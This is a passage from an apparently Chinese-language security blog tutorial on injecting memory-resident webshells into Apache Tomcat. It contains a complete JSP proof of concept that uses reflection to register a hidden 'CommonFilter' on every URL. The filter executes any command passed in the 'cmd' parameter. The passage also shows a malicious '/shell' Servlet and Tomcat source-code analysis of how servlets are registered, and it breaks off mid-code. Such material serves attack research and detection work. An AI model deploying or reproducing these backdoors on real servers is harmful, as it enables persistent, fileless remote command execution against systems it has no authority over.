title="创建恶意Filter"></a>创建恶意Filter</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Filter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        String cmd=request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(cmd);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>            n.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="使用FilterDef封装filter"><a href="#使用FilterDef封装filter" class="headerlink" title="使用FilterDef封装filter"></a>使用FilterDef封装filter</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//filter名称</span><br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;CommonFilter&quot;</span>;<br><span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>filterDef.setFilter(filter);<br>filterDef.setFilterName(name);<br>filterDef.setFilterClass(filter.getClass().getName());<br>standardContext.addFilterDef(filterDef);<br></code></pre></td></tr></table></figure><h5 id="创建filterMap"><a href="#创建filterMap" class="headerlink" title="创建filterMap"></a>创建filterMap</h5><p>filterMap用于filter和路径的绑定</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>filterMap.setFilterName(name);<br>filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>standardContext.addFilterMapBefore(filterMap);<br></code></pre></td></tr></table></figure><h5 id="封装filterConfig及filterDef到filterConfigs"><a href="#封装filterConfig及filterDef到filterConfigs" class="headerlink" title="封装filterConfig及filterDef到filterConfigs"></a>封装filterConfig及filterDef到filterConfigs</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>Configs.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br>    <br><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);<br>filterConfigs.put(name, filterConfig);<br></code></pre></td></tr></table></figure><h4 id="完整POC-1"><a href="#完整POC-1" class="headerlink" title="完整POC"></a>完整POC</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br> <br> <br>&lt;%<br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appContextField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appContextField.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br>%&gt;<br> <br>&lt;%! <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Filter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>            chain.doFilter(request, response);<br>        &#125;<br>    &#125;<br>%&gt;<br> <br>&lt;%<br>    <span class="hljs-type">Shell_Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Filter</span>();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;CommonFilter&quot;</span>;<br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>    filterDef.setFilter(filter);<br>    filterDef.setFilterName(name);<br>    filterDef.setFilterClass(filter.getClass().getName());<br>    standardContext.addFilterDef(filterDef);<br> <br> <br>    <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>    filterMap.setFilterName(name);<br>    filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>    standardContext.addFilterMapBefore(filterMap);<br> <br> <br>    <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br> <br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);<br>    filterConfigs.put(name, filterConfig);<br>%&gt;<br></code></pre></td></tr></table></figure><p>先访问jsp木马</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-32.png" alt="img14"></p><p>此时已经动态注册了我们的恶意Filter，访问任意路由即可执行命令</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-33.png" alt="img15"></p><h3 id="Servlet型"><a href="#Servlet型" class="headerlink" title="Servlet型"></a>Servlet型</h3><p>同样地，我们先实现一个恶意的Servlet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"> <br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> java.io.IOException;<br> <br><span class="hljs-meta">@WebServlet(&quot;/shell&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Servlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br> <br>    &#125;<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span>&#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                e.printStackTrace();<br>            &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br> <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-37.png" alt="img16"></p><p>下面就是实现动态注册Servlet了。</p><h4 id="Servlet创建流程"><a href="#Servlet创建流程" class="headerlink" title="Servlet创建流程"></a>Servlet创建流程</h4><p>我们知道Servlet的生命周期分为如下五部分</p><ol><li>加载：当Tomcat第一次访问Servlet的时候，Tomcat会负责创建Servlet的实例</li><li>初始化：当Servlet被实例化后，Tomcat会调用<code>init()</code>方法初始化这个对象</li><li>处理服务：当浏览器访问Servlet的时候，Servlet 会调用<code>service()</code>方法处理请求</li><li>销毁：当Tomcat关闭时或者检测到Servlet要从Tomcat删除的时候会自动调用<code>destroy()</code>方法，让该实例释放掉所占的资源。一个Servlet如果长时间不被使用的话，也会被Tomcat自动销毁</li><li>卸载：当Servlet调用完<code>destroy()</code>方法后，等待垃圾回收。如果有需要再次使用这个Servlet，会重新调用<code>init()</code>方法进行初始化操作</li></ol><p><a href="https://goodapple.top/archives/1359">前文</a>我们已经分析过，在<code>org.apache.catalina.core.StandardContext</code>类的<code>startInternal()</code>方法中，我们能看到<code>**Listener-&gt;Filter-&gt;Servlet**</code>的加载顺序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br> <br><span class="hljs-keyword">if</span> (ok) &#123;<br>                <span class="hljs-keyword">if</span> (!listenerStart()) &#123;<br>                    log.error(sm.getString(<span class="hljs-string">&quot;standardContext.listenerFail&quot;</span>));<br>                    ok = <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br> <br> <br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// Start manager</span><br>                <span class="hljs-type">Manager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> getManager();<br>                <span class="hljs-keyword">if</span> (manager <span class="hljs-keyword">instanceof</span> Lifecycle) &#123;<br>                    ((Lifecycle) manager).start();<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span>(Exception e) &#123;<br>                log.error(sm.getString(<span class="hljs-string">&quot;standardContext.managerFail&quot;</span>), e);<br>                ok = <span class="hljs-literal">false</span>;<br>            &#125;<br> <br>            <span class="hljs-comment">// Configure and call application filters</span><br>            <span class="hljs-keyword">if</span> (ok) &#123;<br>                <span class="hljs-keyword">if</span> (!filterStart()) &#123;<br>                    log.error(sm.getString(<span class="hljs-string">&quot;standardContext.filterFail&quot;</span>));<br>                    ok = <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br> <br>            <span class="hljs-comment">// Load and initialize all &quot;load on startup&quot; servlets</span><br>            <span class="hljs-keyword">if</span> (ok) &#123;<br>                <span class="hljs-keyword">if</span> (!loadOnStartup(findChildren()))&#123;<br>                    log.error(sm.getString(<span class="hljs-string">&quot;standardContext.servletFail&quot;</span>));<br>                    ok = <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br> <br> <br>            <span class="hljs-comment">// Start ContainerBackgroundProcessor thread</span><br>            <span class="hljs-built_in">super</span>.threadStart();<br>        &#125;<span class="hljs-keyword">if</span> (ok) &#123;<br>                <span class="hljs-keyword">if</span> (!listenerStart()) &#123;<br>                    log.error(sm.getString(<span class="hljs-string">&quot;standardContext.listenerFail&quot;</span>));<br>                    ok = <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br> <br> <br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// Start manager</span><br>                <span class="hljs-type">Manager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> getManager();<br>                <span class="hljs-keyword">if</span> (manager <span class="hljs-keyword">instanceof</span> Lifecycle) &#123;<br>                    ((Lifecycle) manager).start();<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span>(Exception e) &#123;<br>                log.error(sm.getString(<span class="hljs-string">&quot;standardContext.managerFail&quot;</span>), e);<br>                ok = <span class="hljs-literal">false</span>;<br>            &#125;<br> <br>            <span class="hljs-comment">// Configure and call application filters</span><br>            <span class="hljs-keyword">if</span> (ok) &#123;<br>                <span class="hljs-keyword">if</span> (!filterStart()) &#123;<br>                    log.error(sm.getString(<span class="hljs-string">&quot;standardContext.filterFail&quot;</span>));<br>                    ok = <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br> <br>            <span class="hljs-comment">// Load and initialize all &quot;load on startup&quot; servlets</span><br>            <span class="hljs-keyword">if</span> (ok) &#123;<br>                <span class="hljs-keyword">if</span> (!loadOnStartup(findChildren()))&#123;<br>                    log.error(sm.getString(<span class="hljs-string">&quot;standardContext.servletFail&quot;</span>));<br>                    ok = <span class="hljs-literal">false</span>;<br>                &#125;<br> <br>            &#125;<br> <br>            <span class="hljs-comment">// Start ContainerBackgroundProcessor thread</span><br> <br>            <span class="hljs-built_in">super</span>.threadStart();<br> <br>        &#125;<br> <br>...<br></code></pre></td></tr></table></figure><h4 id="创建StandardWrapper"><a href="#创建StandardWrapper" class="headerlink" title="创建StandardWrapper"></a>创建StandardWrapper</h4><p>在<code>StandardContext</code>#<code>startInternal</code>中，调用了<code>fireLifecycleEvent()</code>方法解析web.xml文件，我们跟进</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-38.png" alt="img17"></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">protected void fire<span class="hljs-constructor">LifecycleEvent(String <span class="hljs-params">type</span>, Object <span class="hljs-params">data</span>)</span> &#123;<br>        LifecycleEvent event = <span class="hljs-keyword">new</span> <span class="hljs-constructor">LifecycleEvent(<span class="hljs-params">this</span>, <span class="hljs-params">type</span>, <span class="hljs-params">data</span>)</span>;<br>        <span class="hljs-keyword">for</span> (LifecycleListener listener : lifecycleListeners) &#123;<br>            listener.lifecycle<span class="hljs-constructor">Event(<span class="hljs-params">event</span>)</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>最终通过<code>ContextConfig#webConfig()</code>方法解析web.xml获取各种配置参数</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-42.png" alt="img18"></p><p>然后通过<code>configureContext(webXml)</code>方法创建StandWrapper对象，并根据解析参数初始化StandWrapper对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configureContext</span><span class="hljs-params">(WebXml webxml)</span> &#123;<br>        <span class="hljs-comment">// As far as possible, process in alphabetical order so it is easy to</span><br>        <span class="hljs-comment">// check everything is present</span><br>        <span class="hljs-comment">// Some validation depends on correct public ID</span><br>        context.setPublicId(webxml.getPublicId());<br> <br>...   <span class="hljs-comment">//设置StandardContext参数</span><br> <br>        <br>        <span class="hljs-keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;<br> <br>            <span class="hljs-comment">//创建StandardWrapper对象</span><br>            <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> context.createWrapper();<br> <br>            <span class="hljs-keyword">if</span> (servlet.getLoadOnStartup() != <span class="hljs-literal">null</span>) &#123;<br> <br>                <span class="hljs-comment">//设置LoadOnStartup属性</span><br>                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());<br>            &#125;<br>            <span class="hljs-keyword">if</span> (servlet.getEnabled() != <span class="hljs-literal">null</span>) &#123;<br>                wrapper.setEnabled(servlet.getEnabled().booleanValue());<br>            &#125;<br> <br>            <span class="hljs-comment">//设置ServletName属性</span><br>            wrapper.setName(servlet.getServletName());<br>            Map&lt;String,String&gt; params = servlet.getParameterMap();<br>            <span class="hljs-keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;<br>                wrapper.addInitParameter(entry.getKey(), entry.getValue());<br>            &#125;<br>            wrapper.setRunAs(servlet.getRunAs());<br>            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();<br>            <span class="hljs-keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;<br>                wrapper.addSecurityReference(<br>                        roleRef.getName(), roleRef.getLink());<br>            &#125;<br> <br>            <span class="hljs-comment">//设置ServletClass属性</span><br>            wrapper.setServletClass(servlet.getServletClass());<br>            ...<br>            wrapper.setOverridable(servlet.isOverridable());<br> <br>            <span class="hljs-comment">//将包装好的StandWrapper添加进ContainerBase的children属性中</span><br>            context.addChild(wrapper);<br> <br>           <span class="hljs-keyword">for</span> (Entry&lt;String, String&gt; entry :<br>                webxml.getServletMappings().entrySet()) &#123;<br>          <br>            <span class="hljs-comment">//添加路径映射</span><br>            context.addServletMappingDecoded(entry.getKey(), entry.getValue());<br>        &#125;<br>        &#125;<br>        ...<br>    &#125;<br></code></pre></td></tr></table></figure><p>最后通过<code>addServletMappingDecoded()</code>方法添加Servlet对应的url映射</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-43.png" alt="img19"></p><h4 id="加载StandWrapper"><a href="#加载StandWrapper" class="headerlink" title="加载StandWrapper"></a>加载StandWrapper</h4><p>接着在<code>StandardContext#startInternal</code>方法通过<code>findChildren()</code>获取<code>StandardWrapper</code>类</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-39.png" alt="img20"></p><p>最后依次加载完Listener、Filter后，就通过<code>loadOnStartUp()</code>方法加载wrapper</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">loadOnStartup</span><span class="hljs-params">(Container children[])</span> &#123;<br> <br>    <span class="hljs-comment">// Collect &quot;load on startup&quot; servlets that need to be initialized</span><br>    TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>&lt;&gt;();<br>    <span class="hljs-keyword">for</span> (Container child : children) &#123;<br>        <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> (Wrapper) child;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">loadOnStartup</span> <span class="hljs-operator">=</span> wrapper.getLoadOnStartup();<br> <br>        <span class="hljs-comment">//判断属性loadOnStartup的值</span><br>        <span class="hljs-keyword">if</span> (loadOnStartup &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">key</span> <span 